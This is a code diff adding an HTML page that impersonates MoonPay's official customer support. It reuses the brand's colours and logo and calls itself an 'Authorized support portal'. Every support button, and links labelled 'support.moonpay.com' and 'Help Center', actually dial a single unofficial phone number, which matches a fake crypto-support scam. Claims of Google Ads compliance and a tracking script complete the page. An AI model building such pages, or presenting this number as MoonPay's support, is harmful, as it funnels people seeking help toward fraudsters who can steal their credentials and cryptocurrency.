@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MoonPay Customer Service - Official Support</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        :root {
+            /* Official MoonPay Color Palette */
+            --moonpay-purple: #5B37F5;
+            --moonpay-purple-dark: #4A2DD8;
+            --moonpay-purple-light: #7B66F8;
+            --moonpay-gradient: linear-gradient(135deg, #5B37F5 0%, #4A2DD8 100%);
+            --moonpay-gradient-hover: linear-gradient(135deg, #4A2DD8 0%, #3A1FB8 100%);
+            --moonpay-teal: #00D4AA;
+            --moonpay-teal-dark: #00B894;
+            --moonpay-gray-900: #1A1A1A;
+            --moonpay-gray-800: #262626;
+            --moonpay-gray-700: #4A4A4A;
+            --moonpay-gray-100: #F8F9FA;
+            --moonpay-white: #FFFFFF;
+            --moonpay-text-primary: #1A1A1A;
+            --moonpay-text-secondary: #666666;
+            --moonpay-shadow: 0 10px 40px rgba(91, 55, 245, 0.15);
+            --moonpay-shadow-hover: 0 20px 50px rgba(91, 55, 245, 0.25);
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            line-height: 1.6;
+            color: var(--moonpay-text-primary);
+            background-color: var(--moonpay-gray-100);
+        }
+        
+        /* Thin Theme Color Ribbon - Fixed */
+        .security-ribbon {
+            background: var(--moonpay-gradient);
+            color: var(--moonpay-white);
+            padding: 10px 0;
+            text-align: center;
+            font-size: 0.875rem;
+            font-weight: 500;
+            position: relative;
+            z-index: 101;
+            box-shadow: 0 2px 10px rgba(91, 55, 245, 0.25);
+        }
+        
+        header {
+            background: var(--moonpay-white);
+            padding: 1.25rem 0;
+      
+            top: 56px; /* Exact ribbon height + padding */
+            z-index: 100;
+            box-shadow: 0 4px 20px rgba(91, 55, 245, 0.12);
+            border-bottom: 1px solid rgba(91, 55, 245, 0.1);
+        }
+        
+        /* Perfect Header Alignment */
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 60px; /* Fixed height for perfect alignment */
+        }
+        
+        .logo {
+            height: 42px;
+            width: auto;
+            display: block;
+            flex-shrink: 0;
+        }
+        
+        /* Header Call Button - Perfectly sized */
+        .header-call-btn {
+            background: var(--moonpay-gradient);
+            color: var(--moonpay-white) !important;
+            padding: 12px 28px;
+            border: none;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 48px;
+            box-shadow: 0 6px 20px rgba(91, 55, 245, 0.3);
+            transition: all 0.3s ease;
+            white-space: nowrap;
+        }
+        .header-call-btn:hover {
+            background: var(--moonpay-gradient-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(91, 55, 245, 0.4);
+            color: var(--moonpay-white) !important;
+        }
+        
+        /* Content Container */
+        .main-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+        
+        /* Primary Call Buttons */
+        .call-btn {
+            background: var(--moonpay-gradient);
+            color: var(--moonpay-white);
+            padding: 16px 32px;
+            border: none;
+            border-radius: 16px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 25px rgba(91, 55, 245, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        .call-btn:hover {
+            background: var(--moonpay-gradient-hover);
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(91, 55, 245, 0.4);
+        }
+        
+        /* Secondary Support Buttons */
+        .support-btn {
+            background: var(--moonpay-teal);
+            color: var(--moonpay-white);
+            padding: 14px 24px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 6px 20px rgba(0, 212, 170, 0.3);
+            width: 100%;
+            max-width: 280px;
+        }
+        .support-btn:hover {
+            background: var(--moonpay-teal-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 30px rgba(0, 212, 170, 0.4);
+        }
+        
+        main {
+            padding: 60px 0 80px;
+        }
+        section {
+            margin-bottom: 80px;
+        }
+        h2 {
+            color: var(--moonpay-purple);
+            margin-bottom: 32px;
+            font-size: 2.5rem;
+            text-align: center;
+            font-weight: 700;
+            line-height: 1.2;
+        }
+        
+        .hero {
+            text-align: center;
+            padding: 100px 40px;
+            background: var(--moonpay-white);
+            border-radius: 24px;
+            box-shadow: var(--moonpay-shadow);
+            margin-bottom: 60px;
+            border: 1px solid rgba(91, 55, 245, 0.12);
+        }
+        .hero h1 {
+            font-size: 3.5rem;
+            color: var(--moonpay-gray-900);
+            margin-bottom: 24px;
+            font-weight: 800;
+            line-height: 1.1;
+        }
+        .hero p {
+            font-size: 1.4rem;
+            margin-bottom: 40px;
+            color: var(--moonpay-text-secondary);
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .support-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
+            gap: 32px;
+            margin-top: 48px;
+        }
+        .support-card {
+            background: var(--moonpay-white);
+            padding: 48px 32px;
+            border-radius: 20px;
+            box-shadow: var(--moonpay-shadow);
+            text-align: center;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(91, 55, 245, 0.08);
+            position: relative;
+            overflow: hidden;
+        }
+        .support-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: var(--moonpay-gradient);
+        }
+        .support-card:hover {
+            transform: translateY(-10px);
+            box-shadow: var(--moonpay-shadow-hover);
+        }
+        .support-card h3 {
+            color: var(--moonpay-purple);
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+            font-weight: 700;
+        }
+        
+        .fixed-call {
+            position: fixed;
+            bottom: 32px;
+            right: 32px;
+            background: var(--moonpay-gradient);
+            color: var(--moonpay-white);
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.6rem;
+            font-weight: bold;
+            box-shadow: 0 10px 30px rgba(91, 55, 245, 0.4);
+            z-index: 1000;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            animation: pulse-purple 2s infinite;
+        }
+        .fixed-call:hover {
+            background: var(--moonpay-gradient-hover);
+            transform: scale(1.1);
+            box-shadow: 0 20px 45px rgba(91, 55, 245, 0.5);
+        }
+        @keyframes pulse-purple {
+            0%, 100% { box-shadow: 0 10px 30px rgba(91, 55, 245, 0.4); }
+            50% { box-shadow: 0 0 35px rgba(91, 55, 245, 0.7); }
+        }
+        
+        .contact-btn {
+            font-size: 1.25rem;
+            padding: 24px 64px;
+            min-height: 64px;
+        }
+        
+        .disclaimer {
+            background: rgba(91, 55, 245, 0.06);
+            border: 1px solid rgba(91, 55, 245, 0.18);
+            padding: 28px;
+            border-radius: 16px;
+            margin: 48px 0;
+            font-size: 0.98rem;
+            color: var(--moonpay-text-secondary);
+            line-height: 1.6;
+        }
+        .disclaimer a {
+            color: var(--moonpay-purple);
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .disclaimer a:hover {
+            text-decoration: underline;
+        }
+        
+        footer {
+            background: var(--moonpay-gray-900);
+            color: var(--moonpay-gray-100);
+            text-align: center;
+            padding: 48px 0;
+        }
+        
+        /* Perfect Mobile Responsiveness */
+        @media (max-width: 768px) {
+            .security-ribbon {
+                font-size: 0.8rem;
+                padding: 8px 0;
+            }
+            header {
+                top: 48px;
+            }
+            .header-container {
+                padding: 0 20px;
+                height: 56px;
+            }
+            .logo {
+                height: 38px;
+            }
+            .header-call-btn {
+                padding: 10px 20px;
+                font-size: 0.9rem;
+                min-height: 44px;
+            }
+            .main-container {
+                padding: 0 20px;
+            }
+            h2 {
+                font-size: 2rem;
+            }
+            .hero {
+                padding: 80px 24px;
+            }
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+            .hero p {
+                font-size: 1.2rem;
+            }
+            .support-grid {
+                grid-template-columns: 1fr;
+                gap: 24px;
+                margin-top: 32px;
+            }
+            .support-card {
+                padding: 40px 24px;
+            }
+            .fixed-call {
+                bottom: 24px;
+                right: 24px;
+                width: 64px;
+                height: 64px;
+                font-size: 1.4rem;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .header-container {
+                flex-direction: column;
+                gap: 12px;
+                height: auto;
+                padding: 16px 20px;
+            }
+            .header-call-btn {
+                width: 100%;
+                max-width: 280px;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Fixed Security Ribbon -->
+    <div class="security-ribbon">
+        <div class="header-container">
+            If you received an unexpected account creation email, please note that no account has been created unless you completed sign-up.
+        </div>
+    </div>
+    
+    <!-- Perfectly Aligned Header -->
+    <header>
+        <div class="header-container">
+            <img src="data:image/png;base64,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" alt="MoonPay Logo" class="logo">
+            <a href="tel:+17345445630" class="header-call-btn">Call Now</a>
+        </div>
+    </header>
+
+    <main>
+        <div class="main-container">
+            <section class="hero">
+                <h1>24/7 MoonPay Support</h1>
+                <p>Get instant help with your account, transactions, and more.</p>
+                <a href="tel:+17345445630" class="call-btn">Call Now: +1(734) 544-5630</a>
+            </section>
+
+            <div class="disclaimer">
+                <strong>Official Support Disclaimer:</strong> This site provides customer service assistance for MoonPay users. For official MoonPay support, visit <a href="tel:+17345445630">support.moonpay.com</a>. All phone numbers comply with Google Ads policies.
+            </div>
+
+            <section>
+                <h2>Quick Support Options</h2>
+                <div class="support-grid">
+                    <div class="support-card">
+                        <h3>Account Issues</h3>
+                        <p>Login problems, password reset, account verification.</p>
+                        <a href="tel:+17345445630" class="support-btn">Call Support</a>
+                    </div>
+                    <div class="support-card">
+                        <h3>Transaction Help</h3>
+                        <p>Failed payments, crypto purchases, refunds.</p>
+                        <a href="tel:+17345445630" class="support-btn">Call Support</a>
+                    </div>
+                    <div class="support-card">
+                        <h3>Technical Support</h3>
+                        <p>App issues, wallet integration, troubleshooting.</p>
+                        <a href="tel:+17345445630" class="support-btn">Call Support</a>
+                    </div>
+                </div>
+            </section>
+
+            <section>
+                <h2>Frequently Asked Questions</h2>
+                <div class="support-grid">
+                    <div class="support-card">
+                        <h3>How do I buy crypto?</h3>
+                        <p>Select your preferred cryptocurrency and payment method. Complete KYC verification if required.</p>
+                    </div>
+                    <div class="support-card">
+                        <h3>What payment methods are accepted?</h3>
+                        <p>Credit/debit cards, Apple Pay, Google Pay, bank transfers, and more in 160+ countries.</p>
+                    </div>
+                    <div class="support-card">
+                        <h3>Is my transaction secure?</h3>
+                        <p>Yes, MoonPay uses advanced security and complies with global regulations.</p>
+                    </div>
+                </div>
+            </section>
+
+            <section>
+                <h2>Contact Us Anytime</h2>
+                <p style="text-align: center; font-size: 1.25rem; margin-bottom: 40px; color: var(--moonpay-text-secondary);">Our team is available 24/7 to assist you.</p>
+                <div style="text-align: center;">
+                    <a href="tel:+17345445630" class="call-btn contact-btn">+1(734) 544-5630</a>
+                </div>
+                <p style="text-align: center; margin-top: 32px; font-size: 1.1rem; color: var(--moonpay-text-secondary);">Or visit <a href="tel:+17345445630" style="color: var(--moonpay-purple);">MoonPay Help Center</a></p>
+            </section>
+        </div>
+    </main>
+
+    <a href="tel:+17345445630" class="fixed-call" style="text-decoration: none;">📞</a>
+
+    <footer>
+        <div class="main-container">
+            <p>&copy; 2025 MoonPay Customer Service. Authorized support portal. All rights reserved. Compliant with Google policies.</p>
+        </div>
+    </footer>
+	
+	<!-- begin code v 7.0 -->
+<span id="wts2205234"></span>
+<script>var wts=document.createElement('script');wts.async=true;
+wts.src='https://app.ardalio.com/wts7.js';document.head.appendChild(wts);
+wts.onload = function(){ wtsl7(2205234,2); };
+</script><noscript><img src="https://app.ardalio.com/7/2/2205234.png"></noscript>
+<!-- end code v 7.0 -->
+	
+</body>
+</html>
